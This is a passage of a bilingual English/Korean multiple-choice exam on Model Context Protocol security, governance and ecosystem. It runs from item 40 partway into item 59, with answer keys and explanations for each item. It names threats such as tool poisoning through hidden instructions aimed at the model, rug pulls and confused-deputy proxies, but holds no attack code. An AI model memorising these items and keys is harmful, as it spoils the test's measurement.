사고 검토에서 실패한 tool 호출 하나를 host, client, 그리고 그것을 실행한 server에 걸쳐 추적해야 한다. 여러 홉에 걸쳐 그 상관관계를 전달하도록 설계된 메커니즘은 무엇인가?

A. JSON-RPC id. 요청 id는 시스템 전체에서 영원히 고유하다고 보장되기 때문이다\
B. 요청 메타데이터에 traceparent, tracestate, baggage로 담기는 OpenTelemetry trace context\
C. clientInfo 필드. client가 보내는 모든 요청에서 항상 스스로 보고하기 때문이다\
D. cacheScope 필드. 어떤 요청이 같은 trace에 속하는지 표시한다고 여겨지기 때문이다

<details><summary>정답</summary>

B. W3C Trace Context and Baggage fields travel in request metadata as traceparent, tracestate, and baggage specifically so a request can be correlated across host, client, server, and upstream hops, unlike clientInfo which is display only or cacheScope which governs caching, not tracing.

B. W3C Trace Context와 Baggage 필드는 요청이 host, client, server, 상위 홉에 걸쳐 상관관계를 맺을 수 있도록 바로 그 목적으로 요청 메타데이터에 traceparent, tracestate, baggage로 실려 간다. 표시 전용인 clientInfo나, 추적이 아니라 캐싱을 다루는 cacheScope와는 다르다.

</details>

## 41. [security-and-governance]

A server that the organization has not vetted lists a tool whose annotations claim readOnlyHint true and destructiveHint false. Should a host let the model skip its usual confirmation step for that tool based on those annotations alone?

A. No, but only because destructiveHint defaults to false and cannot be overridden\
B. Yes, because annotations are enforced guarantees the server cannot misreport\
C. No, annotations are hints and must be treated as untrusted unless the server is trusted\
D. Yes, but only if the annotations were also repeated inside the tool's own description text

**한국어**

조직이 검증하지 않은 server가 annotation에 readOnlyHint true와 destructiveHint false를 주장하는 tool을 나열한다. host는 그 annotation만 근거로 그 tool에 대한 평소 확인 단계를 모델이 건너뛰도록 허용해야 하는가?

A. 아니다. 다만 destructiveHint의 기본값이 false이고 덮어쓸 수 없기 때문일 뿐이다\
B. 그렇다. annotation은 server가 잘못 보고할 수 없는 강제된 보장이기 때문이다\
C. 아니다. annotation은 힌트이며 server가 신뢰된 경우가 아니면 신뢰할 수 없는 것으로 다뤄야 한다\
D. 그렇다. 다만 annotation이 tool 자체 설명 텍스트 안에도 반복되어 있을 때만 그렇다

<details><summary>정답</summary>

C. Tool annotations are hints, not enforced guarantees, and must be treated as untrusted input unless the server providing them is itself trusted, so a host should not waive its confirmation step for an unvetted server purely because the annotations look reassuring.

C. tool annotation은 강제된 보장이 아니라 힌트다. 그것을 제공하는 server 자체가 신뢰된 경우가 아니면 신뢰할 수 없는 입력으로 다뤄야 한다. 그래서 host는 검증되지 않은 server의 annotation이 안심되어 보인다는 이유만으로 확인 단계를 면제해서는 안 된다.

</details>

## 42. [security-and-governance]

A user clicks Authorize and is redirected back with an authorization response, but the issuer named in that response does not match the issuer the client recorded before redirecting. What must the client do?

A. Accept the response, but only after normalizing both issuer strings to lowercase first\
B. Accept the response, since the authorization code itself is proof enough of a valid issuer\
C. Accept the response anyway, since the issuer only matters for error responses, not successful ones\
D. Reject the response as a mismatch, even though the rest of the exchange otherwise looks successful

**한국어**

사용자가 Authorize를 누르고 인가 응답과 함께 redirect되어 돌아온다. 그런데 그 응답에 적힌 issuer가 client가 redirect 전에 기록해 둔 issuer와 다르다. client는 무엇을 해야 하는가?

A. 응답을 받아들이되, 먼저 두 issuer 문자열을 소문자로 정규화한 뒤에만 그렇게 한다\
B. 응답을 받아들인다. authorization code 자체가 유효한 issuer라는 충분한 증거이기 때문이다\
C. 어쨌든 응답을 받아들인다. issuer는 성공 응답이 아니라 오류 응답에서만 중요하기 때문이다\
D. 나머지 교환이 겉보기에 성공적이라 해도 불일치로 보고 응답을 거부한다

<details><summary>정답</summary>

D. Issuer validation defends against mix-up attacks: the client records the expected issuer before redirecting and compares the returned issuer exactly, with no normalization, rejecting any mismatch including on responses that otherwise look like success, since a valid-looking code from the wrong issuer is exactly the attack this check catches.

D. issuer 검증은 mix-up 공격을 막는다. client는 redirect 전에 기대하는 issuer를 기록하고 돌아온 issuer와 정규화 없이 정확히 비교한다. 그리고 겉보기에 성공처럼 보이는 응답까지 포함해 불일치는 모두 거부한다. 엉뚱한 issuer에서 온 유효해 보이는 code가 바로 이 검사가 잡아내는 공격이기 때문이다.

</details>

## 43. [security-and-governance]

A server exposes a tool that calls an expensive external search API. Without any limits, a single misbehaving client could exhaust the server's quota for every other user. What control most directly addresses this?

A. Per-tool rate limiting on the server side, independent of what the client claims to need\
B. Moving the rate limit into the tool's own description text as an instruction to the model\
C. Increasing the tool's timeout so retries happen less often\
D. Relying on the client's own idempotentHint declaration to slow down repeated calls

**한국어**

어떤 server가 비싼 외부 검색 API를 호출하는 tool을 노출한다. 아무 제한이 없으면 오작동하는 client 하나가 다른 모든 사용자 몫까지 server의 할당량을 다 써 버릴 수 있다. 이것을 가장 직접적으로 다루는 통제는 무엇인가?

A. client가 필요하다고 주장하는 것과 무관하게 server 쪽에서 tool별 rate limit을 건다\
B. rate limit을 모델에 대한 지시로 tool 자체 설명 텍스트에 옮겨 적는다\
C. 재시도가 덜 일어나도록 tool의 타임아웃을 늘린다\
D. 반복 호출을 늦추도록 client 자신의 idempotentHint 선언에 의존한다

<details><summary>정답</summary>

A. Servers are expected to enforce their own rate limits regardless of what a client declares, since a client-side hint or a longer timeout does nothing to stop a determined or buggy caller, and a limit written only into a description is advisory text the model may ignore.

A. server는 client가 무엇을 선언하든 자체 rate limit을 강제해야 한다. client 쪽 힌트나 더 긴 타임아웃은 작정한 호출자나 버그 있는 호출자를 막지 못한다. 설명에만 적힌 제한은 모델이 무시할 수 있는 참고 텍스트일 뿐이다.

</details>

## 44. [security-and-governance]

A team is designing its audit logging for MCP tool calls. A reviewer objects that the draft design logs the full raw arguments of every call, including free-text fields a user might paste sensitive data into. What should the design change to?

A. Stop logging arguments at all, so the audit trail only records that some call happened\
B. Redact or omit sensitive argument content so audit records never carry credentials, secrets, or personal data\
C. Encrypt the arguments with a key stored next to the log, so any reader can decrypt them\
D. Log the full raw arguments anyway, since audit completeness always fully outweighs any data sensitivity concerns

**한국어**

한 팀이 MCP tool 호출의 감사 로깅을 설계하고 있다. 검토자는 초안 설계가 모든 호출의 원본 인자 전체를 기록한다고 반대한다. 여기에는 사용자가 민감한 데이터를 붙여 넣을 수 있는 자유 텍스트 필드도 포함된다. 설계를 어떻게 바꿔야 하는가?

A. 인자를 아예 기록하지 않아서 감사 기록에는 어떤 호출이 있었다는 사실만 남긴다\
B. 민감한 인자 내용을 가리거나 빼서 감사 기록에 자격 증명, 비밀 값, 개인 데이터가 절대 담기지 않게 한다\
C. 로그 바로 옆에 저장한 키로 인자를 암호화해서 누구든 읽는 사람이 복호화할 수 있게 한다\
D. 감사 완전성은 데이터 민감도 우려보다 언제나 완전히 우선하므로 어쨌든 원본 인자 전체를 기록한다

<details><summary>정답</summary>

B. Audit and observability practice requires that logs never contain credentials, secrets, or personal data, so sensitive argument content should be redacted or omitted while still preserving enough structure, such as method, tool name, and correlation ids, to support tracing and attribution.

B. 감사와 관측성 관행은 로그에 자격 증명, 비밀 값, 개인 데이터가 절대 들어가지 않기를 요구한다. 그래서 민감한 인자 내용은 가리거나 빼야 한다. 다만 추적과 귀속을 뒷받침할 만큼의 구조, 예를 들어 메서드, tool 이름, 상관관계 id는 남겨 둔다.

</details>

## 45. [security-and-governance]

An MCP proxy uses one static client id when talking to third-party authorization servers on behalf of many different downstream clients. What additional step does this design require to avoid a confused deputy problem?

A. The proxy should stop validating redirect URIs, since the static client id already vouches for them\
B. The proxy should reuse the same authorization code across all downstream clients to simplify the flow\
C. The proxy must obtain user consent for each dynamically registered client before forwarding it onward\
D. None, since a single static client id already isolates each downstream client automatically

**한국어**

어떤 MCP proxy가 여러 하위 client를 대신해 제3자 인가 서버와 통신할 때 정적 client id 하나를 쓴다. confused deputy 문제를 피하려면 이 설계에 어떤 추가 단계가 필요한가?

A. proxy는 redirect URI 검증을 멈춰야 한다. 정적 client id가 이미 그것을 보증하기 때문이다\
B. 흐름을 단순하게 하려고 proxy는 모든 하위 client에 같은 authorization code를 재사용해야 한다\
C. proxy는 동적으로 등록된 각 client에 대해 전달하기 전에 사용자 동의를 받아야 한다\
D. 아무것도 필요 없다. 정적 client id 하나가 이미 각 하위 client를 자동으로 격리하기 때문이다

<details><summary>정답</summary>

C. A proxy that presents one static client id to an authorization server on behalf of many dynamically registered clients must obtain explicit user consent for each one before forwarding, since without that step the authorization server cannot distinguish which downstream client is actually acting.

C. 동적으로 등록된 여러 client를 대신해 인가 서버에 정적 client id 하나를 내미는 proxy는 전달하기 전에 client마다 명시적 사용자 동의를 받아야 한다. 그 단계가 없으면 인가 서버는 실제로 어느 하위 client가 행동하는지 구분할 수 없다.

</details>

## 46. [security-and-governance]

A workflow only needs to read a customer's order history, but the team is about to grant it a scope that also allows placing and cancelling orders. What principle should push back on that request?

A. Statelessness, since order history is state that clearly spans multiple requests\
B. Cache scope, since public and private caching require entirely different access permissions\
C. Idempotency, since placing a new order is not an idempotent operation at all\
D. Least privilege, since the workflow should be granted only the access its task requires

**한국어**

어떤 워크플로는 고객의 주문 내역을 읽기만 하면 되는데, 팀이 주문을 넣고 취소하는 것까지 허용하는 scope를 주려 한다. 그 요청에 반대할 근거가 되는 원칙은 무엇인가?

A. stateless. 주문 내역은 분명히 여러 요청에 걸친 상태이기 때문이다\
B. cache scope. public 캐싱과 private 캐싱은 완전히 다른 접근 권한을 요구하기 때문이다\
C. 멱등성. 새 주문을 넣는 것은 멱등한 작업이 전혀 아니기 때문이다\
D. 최소 권한. 워크플로에는 그 작업에 필요한 접근만 주어야 하기 때문이다

<details><summary>정답</summary>

D. Least privilege means granting only the access a task actually needs, so a read-only history workflow should receive a read-only scope rather than a broader one that also allows placing or cancelling orders, independent of idempotency, statelessness, or caching considerations that do not bear on this decision.

D. 최소 권한은 작업에 실제로 필요한 접근만 준다는 뜻이다. 그래서 읽기 전용 내역 워크플로에는 주문을 넣거나 취소하는 것까지 허용하는 넓은 scope가 아니라 읽기 전용 scope를 주어야 한다. 이 결정과 관계없는 멱등성, stateless, 캐싱 고려와는 별개다.

</details>

## 47. [security-and-governance] (복수 정답)

A policy engine is scoring a candidate server for known MCP attack surfaces before it is approved. Which three are real threats the engine should score for? Select three.

A. Cache staleness, where a ttlMs value of zero simply means a result is treated as stale immediately\
B. Tool poisoning through a description that contains hidden instructions aimed at the model\
C. Confused deputy behavior in a proxy that forwards to a third-party authorization server using one static client id\
D. Rug pulls, where a previously approved tool's definition silently changes after approval

**한국어**

정책 엔진이 후보 server를 승인하기 전에 알려진 MCP 공격 표면을 기준으로 점수를 매기고 있다. 엔진이 점수를 매겨야 할 실제 위협 세 개는 무엇인가? 세 개 고르시오.

A. 캐시 신선도 문제. ttlMs 값이 0이면 결과가 즉시 오래된 것으로 취급된다는 뜻일 뿐이다\
B. 모델을 노린 숨은 지시가 담긴 설명을 통한 tool poisoning\
C. 정적 client id 하나로 제3자 인가 서버에 전달하는 proxy의 confused deputy 동작\
D. rug pull. 이전에 승인된 tool의 정의가 승인 뒤 조용히 바뀌는 것이다

<details><summary>정답</summary>

B, C, D. Tool poisoning, rug pulls, and confused deputy proxy behavior are documented threats with specific mitigations such as output sanitization, definition pinning, and per-client consent. A ttlMs of zero simply means the result is treated as stale immediately, which is a caching detail rather than a security threat.

B, C, D. tool poisoning, rug pull, proxy의 confused deputy 동작은 문서화된 위협이며 출력 정제, 정의 고정, client별 동의 같은 구체적 완화책이 있다. ttlMs가 0이면 결과가 즉시 오래된 것으로 취급된다는 뜻일 뿐이며 이것은 보안 위협이 아니라 캐싱 세부 사항이다.

</details>

## 48. [security-and-governance] (복수 정답)

A team is checking their MCP client's OAuth implementation against the 2026-07-28 authorization requirements. Which three practices are actually required? Select three.

A. Send the bearer token in the Authorization header on every HTTP request, never in the query string\
B. Send the resource parameter identifying the canonical server URI on both the authorization and token requests\
C. Use PKCE with S256 when the client is capable of it\
D. Store a long-lived refresh token locally and assume one will always be issued

**한국어**

한 팀이 자기 MCP client의 OAuth 구현을 2026-07-28 인가 요구 사항과 대조하고 있다. 실제로 필수인 관행 세 개는 무엇인가? 세 개 고르시오.

A. bearer 토큰은 모든 HTTP 요청에서 Authorization 헤더로 보내고 쿼리 문자열로는 절대 보내지 않는다\
B. 정식 server URI를 식별하는 resource 파라미터를 인가 요청과 토큰 요청 모두에 보낸다\
C. client가 지원할 수 있으면 S256으로 PKCE를 쓴다\
D. 수명이 긴 refresh 토큰을 로컬에 저장하고 항상 발급된다고 가정한다

<details><summary>정답</summary>

A, B, C. Bearer tokens belong only in the Authorization header, PKCE with S256 is mandatory when supported, and Resource Indicators must be sent on both the authorization and token requests. A refresh token should never be assumed, since public clients' refresh tokens rotate and one may not be issued at all.

A, B, C. bearer 토큰은 Authorization 헤더에만 넣어야 하고 지원되면 S256 PKCE는 필수이며 Resource Indicators는 인가 요청과 토큰 요청 모두에 보내야 한다. refresh 토큰은 절대 가정해서는 안 된다. public client의 refresh 토큰은 교체되고 아예 발급되지 않을 수도 있기 때문이다.

</details>

## 49. [use-cases-and-ecosystem]

A team is drawing a responsibility matrix for a new remote MCP deployment. Who is the right owner for implementing Protected Resource Metadata and validating token audience?

A. The server author, since these are requirements on the resource server itself\
B. The registry publisher, since Protected Resource Metadata is part of server.json\
C. The end user, since they are the one granting consent\
D. The gateway operator only, and never the server author

**한국어**

한 팀이 새 원격 MCP 배포의 책임 매트릭스를 그리고 있다. Protected Resource Metadata 구현과 토큰 audience 검증의 올바른 책임자는 누구인가?

A. server 작성자. 이것들은 resource server 자체에 대한 요구 사항이기 때문이다\
B. 레지스트리 게시자. Protected Resource Metadata는 server.json의 일부이기 때문이다\
C. 최종 사용자. 동의를 주는 사람이기 때문이다\
D. 게이트웨이 운영자만이며 server 작성자는 절대 아니다

<details><summary>정답</summary>

A. Protected Resource Metadata and audience validation are requirements on the MCP server acting as an OAuth resource server, so the server author owns implementing them, distinct from the end user's consent role, the registry publisher's metadata role, or a gateway operator who may add further enforcement but does not replace this duty.

A. Protected Resource Metadata와 audience 검증은 OAuth resource server 역할을 하는 MCP server에 대한 요구 사항이다. 그래서 구현 책임은 server 작성자에게 있다. 이것은 최종 사용자의 동의 역할, 레지스트리 게시자의 메타데이터 역할과 다르다. 게이트웨이 운영자는 추가 강제를 더할 수 있지만 이 책임을 대신하지는 않는다.

</details>

## 50. [use-cases-and-ecosystem]

A team exposes a prompt that takes a repository argument, and users keep mistyping repository names in the host's form. Which MCP capability lets the host suggest valid values while the user types?

A. A subscriptions/listen stream that pushes every repository name to the client in advance\
B. The completion/complete request, which returns suggested values for a prompt argument\
C. An elicitation/create request that the host sends to the server for every character typed\
D. A resources/list call on every keystroke, filtered by the host down to repository names

**한국어**

한 팀이 repository 인자를 받는 prompt를 노출하는데, 사용자들이 host 폼에서 저장소 이름을 계속 잘못 입력한다. 사용자가 입력하는 동안 host가 유효한 값을 제안하게 해 주는 MCP capability는 무엇인가?

A. 모든 저장소 이름을 미리 client에 밀어 주는 subscriptions/listen 스트림\
B. prompt 인자에 대한 제안 값을 반환하는 completion/complete 요청\
C. 입력되는 글자마다 host가 server에 보내는 elicitation/create 요청\
D. 키를 누를 때마다 하는 resources/list 호출을 host가 저장소 이름만 남도록 거른다

<details><summary>정답</summary>

B. Argument completion is the utility built for this: the host calls completion/complete with a reference to the prompt and the partial argument value, and the server returns up to 100 suggested values. Listing resources or streaming notifications is not a completion mechanism, and elicitation is a server request for user input, not a host lookup against the server.

B. 이 용도로 만든 유틸리티가 인자 자동 완성이다. host가 prompt 참조와 일부만 입력된 인자 값으로 completion/complete를 호출하면 server는 제안 값을 최대 100개 반환한다. resource 나열이나 notification 스트리밍은 자동 완성 메커니즘이 아니다. elicitation은 server가 사용자 입력을 요청하는 것이지 host가 server에 조회하는 것이 아니다.

</details>

## 51. [use-cases-and-ecosystem]

A third-party extension published as com.example/my-extension makes a breaking change to its wire format. The maintainer wants integrations built against the old behavior to keep working unmodified. What should the maintainer do?

A. Keep the same identifier, since extension identifiers are versioned automatically behind the scenes\
B. Remove the old identifier entirely so no client can accidentally negotiate the outdated behavior\
C. Publish the breaking change under a new identifier, such as com.example/my-extension-v2, rather than reusing the old one\
D. Keep the same identifier, since every client is required to renegotiate extensions on each request anyway

**한국어**

com.example/my-extension으로 게시된 제3자 extension이 통신 형식에 하위 호환되지 않는 변경을 한다. 관리자는 예전 동작에 맞춰 만든 통합이 수정 없이 계속 동작하기를 바란다. 관리자는 무엇을 해야 하는가?

A. 같은 식별자를 유지한다. extension 식별자는 내부적으로 자동으로 버전이 매겨지기 때문이다\
B. 어떤 client도 실수로 예전 동작을 협상하지 않도록 예전 식별자를 완전히 없앤다\
C. 하위 호환되지 않는 변경은 예전 식별자를 재사용하지 말고 com.example/my-extension-v2 같은 새 식별자로 게시한다\
D. 같은 식별자를 유지한다. 어차피 모든 client는 요청마다 extension을 다시 협상해야 하기 때문이다

<details><summary>정답</summary>

C. A breaking change to an extension needs a new identifier so old and new behavior can be negotiated and run side by side, since identifiers are not automatically versioned and removing the old one outright would break every integration still relying on it instead of only the ones that opt in.

C. extension에 하위 호환되지 않는 변경을 하려면 새 식별자가 필요하다. 그래야 예전 동작과 새 동작을 각각 협상하고 나란히 운영할 수 있다. 식별자에는 자동으로 버전이 매겨지지 않는다. 예전 식별자를 아예 없애면 새 동작을 선택한 통합만이 아니라 아직 예전 것에 의존하는 모든 통합이 동작하지 않게 된다.

</details>

## 52. [use-cases-and-ecosystem]

An MCP Apps interface asks for camera access by including camera in its permissions metadata, and the app's developer assumes the camera will now be available inside the sandboxed iframe. Is that assumption correct?

A. No, because permissions metadata only ever applies to network access, never device hardware\
B. Yes, but only for microphone and geolocation, never specifically for camera\
C. Yes, since declaring a permission in that metadata field is what grants it immediately\
D. No, since the host may honor a requested permission but the app should never assume it was actually granted

**한국어**

MCP Apps 인터페이스가 permissions 메타데이터에 camera를 넣어 카메라 접근을 요청한다. 앱 개발자는 이제 샌드박스된 iframe 안에서 카메라를 쓸 수 있다고 가정한다. 그 가정이 맞는가?

A. 아니다. permissions 메타데이터는 오로지 네트워크 접근에만 적용되고 장치 하드웨어에는 절대 적용되지 않기 때문이다\
B. 그렇다. 다만 마이크와 위치 정보에만 해당하고 카메라는 절대 해당하지 않는다\
C. 그렇다. 그 메타데이터 필드에 권한을 선언하는 것 자체가 그 권한을 즉시 부여하기 때문이다\
D. 아니다. host가 요청된 권한을 들어줄 수는 있지만 앱은 그 권한이 실제로 부여됐다고 절대 가정해서는 안 된다

<details><summary>정답</summary>

D. Permissions such as camera, microphone, geolocation, and clipboardWrite are requests the host may choose to honor, not guarantees, so a well-behaved app treats a declared permission as optional and checks at runtime rather than assuming the capability is present just because it was requested.

D. camera, microphone, geolocation, clipboardWrite 같은 권한은 보장이 아니라 host가 들어줄지 선택할 수 있는 요청이다. 그래서 제대로 만든 앱은 선언한 권한을 선택 사항으로 다루고 요청했다는 이유만으로 그 기능이 있다고 가정하지 않고 실행 시점에 확인한다.

</details>

## 53. [use-cases-and-ecosystem]

A platform team is putting a gateway in front of several internal MCP servers so client requests can be routed without the gateway parsing every request body. What should the gateway route on?

A. The Mcp-Method and Mcp-Name headers, validating them against the body rather than trusting them blindly\
B. The clientInfo field inside the request metadata, since it uniquely identifies which server should handle the request\
C. The JSON-RPC id, since ids encode which server originally issued them\
D. The cacheScope field, since it was designed to carry routing information

**한국어**

플랫폼 팀이 여러 사내 MCP server 앞에 게이트웨이를 두어, 게이트웨이가 요청 본문을 일일이 파싱하지 않고도 client 요청을 라우팅하게 하려 한다. 게이트웨이는 무엇을 기준으로 라우팅해야 하는가?

A. Mcp-Method와 Mcp-Name 헤더. 무작정 믿지 말고 본문과 대조해 검증한다\
B. 요청 메타데이터 안의 clientInfo 필드. 어느 server가 요청을 처리해야 하는지 고유하게 식별하기 때문이다\
C. JSON-RPC id. id에는 그것을 처음 발급한 server가 인코딩되어 있기 때문이다\
D. cacheScope 필드. 라우팅 정보를 담도록 설계됐기 때문이다

<details><summary>정답</summary>

A. The required headers exist precisely so a gateway can route and enforce policy without parsing every body, but it must still validate that the headers agree with the body and reject a mismatch, rather than routing on clientInfo, which is self-reported, or on fields never meant for routing.

A. 필수 헤더는 바로 게이트웨이가 모든 본문을 파싱하지 않고 라우팅하고 정책을 강제할 수 있도록 존재한다. 다만 게이트웨이는 헤더가 본문과 일치하는지 여전히 검증하고 불일치를 거부해야 한다. 스스로 보고하는 clientInfo나 라우팅용으로 만든 적 없는 필드로 라우팅해서는 안 된다.

</details>

## 54. [use-cases-and-ecosystem]

A team preparing for a production launch wants one end-to-end rehearsal that exercises discovery, a validated tool call, a consent round trip, and audit logging together, rather than testing each in isolation. What kind of exercise does this describe?

A. A registry namespace verification check performed once before any server is first published\
B. An integrated readiness rehearsal spanning discovery, execution, consent, and audit together\
C. A load test that only measures raw requests successfully processed per second overall\
D. A narrow unit test that only exercises a single JSON Schema validator function

**한국어**

프로덕션 출시를 준비하는 팀이 discovery, 검증된 tool 호출, 동의 왕복, 감사 로깅을 각각 따로 테스트하지 않고 한꺼번에 실행해 보는 종단 간 리허설 하나를 원한다. 이것은 어떤 종류의 훈련인가?

A. server를 처음 게시하기 전에 한 번 수행하는 레지스트리 네임스페이스 검증 점검\
B. discovery, 실행, 동의, 감사를 함께 아우르는 통합 준비 리허설\
C. 전체적으로 초당 성공 처리 요청 수만 측정하는 부하 테스트\
D. JSON Schema 검증 함수 하나만 실행해 보는 좁은 단위 테스트

<details><summary>정답</summary>

B. Rehearsing one full exchange that touches discovery, validated tool execution, MRTR consent, and audit logging together is an integrated readiness check spanning every domain, which is a different exercise from a narrow unit test, a pure throughput load test, or a registry ownership check.

B. discovery, 검증된 tool 실행, MRTR 동의, 감사 로깅을 함께 건드리는 전체 교환 하나를 리허설하는 것은 모든 도메인에 걸친 통합 준비 점검이다. 이것은 좁은 단위 테스트, 순수 처리량 부하 테스트, 레지스트리 소유권 점검과는 다른 훈련이다.

</details>

## 55. [use-cases-and-ecosystem]

> 변동 가능(경계): OAuth Client Credentials extension은 스펙 본문이 아니라 별도 extension 문서에서 오므로 존재 여부와 성숙도가 바뀔 수 있습니다. 스펙 본문이 아니라 별도 문서에서 오는 내용입니다.

A team is connecting a nightly batch job, with no human present, to an MCP server for a machine-to-machine integration. Ordinary user-facing OAuth consent screens do not fit this case. What should the team reach for?

A. URL-mode elicitation, since it is specifically designed for out-of-band human approval\
B. A server-minted handle, since such handles fully replace authorization for automated batch clients\
C. The OAuth Client Credentials extension, built for machine-to-machine clients such as CI or daemons\
D. Dynamic Client Registration, since it removes the need for any authorization at all

**한국어**

한 팀이 사람이 없는 야간 배치 작업을 machine-to-machine 통합용으로 MCP server에 연결하려 한다. 일반적인 사용자용 OAuth 동의 화면은 이 경우에 맞지 않는다. 팀은 무엇을 써야 하는가?

A. URL 모드 elicitation. 대역 외 사람 승인을 위해 특별히 설계됐기 때문이다\
B. server가 발급한 handle. 이런 handle은 자동화된 배치 client의 인가를 완전히 대체하기 때문이다\
C. OAuth Client Credentials extension. CI나 데몬 같은 machine-to-machine client를 위해 만들어졌다\
D. Dynamic Client Registration. 인가 자체를 아예 필요 없게 만들기 때문이다

<details><summary>정답</summary>

C. The OAuth Client Credentials extension is built for machine-to-machine clients like CI jobs and daemons that have no human present to complete an interactive consent flow, unlike elicitation which needs a human, DCR which only registers a client rather than removing authorization, or handles which address state, not identity.

C. OAuth Client Credentials extension은 대화형 동의 흐름을 마칠 사람이 없는 CI 작업이나 데몬 같은 machine-to-machine client를 위해 만들어졌다. 사람이 필요한 elicitation, 인가를 없애는 것이 아니라 client를 등록할 뿐인 DCR, 신원이 아니라 상태를 다루는 handle과는 다르다.

</details>

## 56. [use-cases-and-ecosystem]

> 변동 가능(경계): 정답이 SDK 등급의 판정 기준(conformance 100%, triage와 버그 수정 기한)에 달려 있고 이 기준은 거버넌스 문서에서 바뀔 수 있습니다. 스펙 본문이 아니라 별도 문서에서 오는 내용입니다.

A platform team is choosing an SDK to build a new production MCP server and wants strong guarantees about spec conformance and how fast critical bugs get fixed. Which SDK tier should they prefer, all else equal?

A. Tier 3, since experimental SDKs get the newest features first\
B. Whichever tier has the largest download count, since popularity is the only signal that matters\
C. Tier 2, since an 80 percent conformance pass rate is the ecosystem norm\
D. Tier 1, since it passes full conformance tests and commits to fast triage and bug fixes

**한국어**

플랫폼 팀이 새 프로덕션 MCP server를 만들 SDK를 고르고 있으며 명세 준수와 치명적 버그 수정 속도에 대해 강한 보장을 원한다. 다른 조건이 같다면 어느 SDK tier를 골라야 하는가?

A. Tier 3. 실험적 SDK가 최신 기능을 가장 먼저 받기 때문이다\
B. 다운로드 수가 가장 많은 tier. 인기만이 의미 있는 신호이기 때문이다\
C. Tier 2. 80퍼센트 준수 테스트 통과율이 생태계 표준이기 때문이다\
D. Tier 1. 전체 준수 테스트를 통과하고 빠른 분류와 버그 수정을 약속하기 때문이다

<details><summary>정답</summary>

D. SDK tiering gives Tier 1 the strongest guarantees, full conformance test passage plus fast triage and critical bug fix commitments, which matters directly for a production deployment, while Tier 2 accepts a lower conformance bar and Tier 3 is explicitly experimental regardless of its download popularity.

D. SDK tier 체계에서 Tier 1이 가장 강한 보장을 준다. 전체 준수 테스트 통과에 더해 빠른 분류와 치명적 버그 수정을 약속하며 이는 프로덕션 배포에 직접 중요하다. Tier 2는 더 낮은 준수 기준을 허용하고 Tier 3는 다운로드 인기와 상관없이 명시적으로 실험적이다.

</details>

## 57. [use-cases-and-ecosystem]

> 변동 가능(경계): experimental-ext- 저장소와 Working Group, Interest Group 소유 구조는 extension 절차(SEP-2133)와 조직 구성에서 오는 정보입니다. 스펙 본문이 아니라 별도 문서에서 오는 내용입니다.

A working group wants to incubate a new MCP extension in the open before proposing it as an official one. Where does that early work belong under the extensions process?

A. In an experimental-ext- repository owned by a Working Group or Interest Group\
B. Directly inside the core specification's draft, since every extension starts as a core feature\
C. In any private fork, since extensions need no public process before clients adopt them\
D. Under the io.modelcontextprotocol prefix right away, since official status comes with publication

**한국어**

한 working group이 새 MCP extension을 공식 extension으로 제안하기 전에 공개적으로 키워 보려 한다. extensions 절차에서 그 초기 작업은 어디에 두어야 하는가?

A. Working Group이나 Interest Group이 소유한 experimental-ext- 저장소\
B. 모든 extension은 핵심 기능으로 시작하므로 핵심 명세 draft 안에 바로 둔다\
C. extension은 client가 채택하기 전에 공개 절차가 필요 없으므로 아무 비공개 fork에나 둔다\
D. 게시하면 공식 지위가 따라오므로 곧바로 io.modelcontextprotocol 접두사 아래에 둔다

<details><summary>정답</summary>

A. Experimental extensions live in repositories with the experimental-ext- prefix that belong to a Working Group or Interest Group; becoming official goes through an Extensions Track SEP with a reference implementation in an official SDK and review by the Core Maintainers. The io.modelcontextprotocol prefix is not claimed by publishing, and extensions stay out of the core specification.

A. 실험적 extension은 Working Group이나 Interest Group에 속한 experimental-ext- 접두사 저장소에 둔다. 공식이 되려면 공식 SDK의 참조 구현을 갖춘 Extensions Track SEP를 거치고 Core Maintainers의 검토를 받아야 한다. io.modelcontextprotocol 접두사는 게시한다고 얻어지지 않으며 extension은 핵심 명세 밖에 둔다.

</details>

## 58. [use-cases-and-ecosystem]

> 변동 정보: MCP Registry가 preview라는 것은 생태계 서비스의 현재 상태입니다. GA로 바뀌면 정답도 바뀝니다.

An aggregator team plans to mirror the official MCP Registry into its own catalog for customers. What does the registry's current status tell the team to plan for?

A. A mandatory security scan of every package, since the registry certifies server code\
B. Breaking changes or data resets before general availability, since the registry is in preview\
C. Paid access tiers, since mirroring the registry requires a commercial license agreement\
D. Nothing special, since the registry is generally available with a frozen data model

**한국어**

한 aggregator 팀이 공식 MCP Registry를 고객용 자체 카탈로그로 미러링하려 한다. 레지스트리의 현재 상태로 보아 팀은 무엇에 대비해야 하는가?

A. 모든 패키지의 필수 보안 스캔. 레지스트리가 server 코드를 인증하기 때문이다\
B. 정식 출시 전의 하위 호환되지 않는 변경이나 데이터 초기화. 레지스트리가 preview 단계이기 때문이다\
C. 유료 접근 tier. 레지스트리를 미러링하려면 상용 라이선스 계약이 필요하기 때문이다\
D. 특별히 없다. 레지스트리는 데이터 모델이 고정된 정식 출시 상태이기 때문이다

<details><summary>정답</summary>

B. The MCP Registry is in preview, and its maintainers warn that breaking changes or data resets may happen before general availability, so an aggregator should design for re-syncs and schema changes. The registry hosts metadata and delegates security scanning to package registries and downstream aggregators; it does not certify server code.

B. MCP Registry는 preview 단계이며 관리자들은 정식 출시 전에 하위 호환되지 않는 변경이나 데이터 초기화가 있을 수 있다고 경고한다. 그래서 aggregator는 재동기화와 스키마 변경을 고려해 설계해야 한다. 레지스트리는 메타데이터를 호스팅하고 보안 스캔은 패키지 레지스트리와 하위 aggregator에 맡긴다. server 코드를 인증하지 않는다.

</details>

## 59. [use-cases-and-ecosystem] (복수 정답)

A host developer is implementing support for the MCP Apps extension and reading how the UI resource's own metadata constrains the sandboxed iframe. Which three statements are correct? Select three.

A. The UI resource is fetched through an ordinary resources/read call and carries the mime type text/html;profile=mcp-app\
B. When the UI resource's metadata omits csp entirely, the host must apply a restrictive default that blocks outgoing connections\
C. Requesting camera or microphone access through the permissions metadata grants it automatically without any host involvement\
D. The UI resource's csp metadata is an object of domain lists, such as connectDomains and frameDomains, not one flat list of allowed origins

**한국어**

host 개발자가 MCP Apps extension 지원을 구현하면서 UI resource 자체의 메타데이터가 샌드박스된 iframe을 어떻게 제약하는지 읽고 있다. 맞는 설명 세 개는 무엇인가? 세 개 고르시오.

A. UI resource는 일반 resources/read 호출로 가져오며 mime type text/html;profile=mcp-app을 가진다\
B. UI resource 메타데이터에 csp가 아예 없으면 host는 외부로 나가는 연결을 막는 제한적인 기본값을 적용해야 한다\
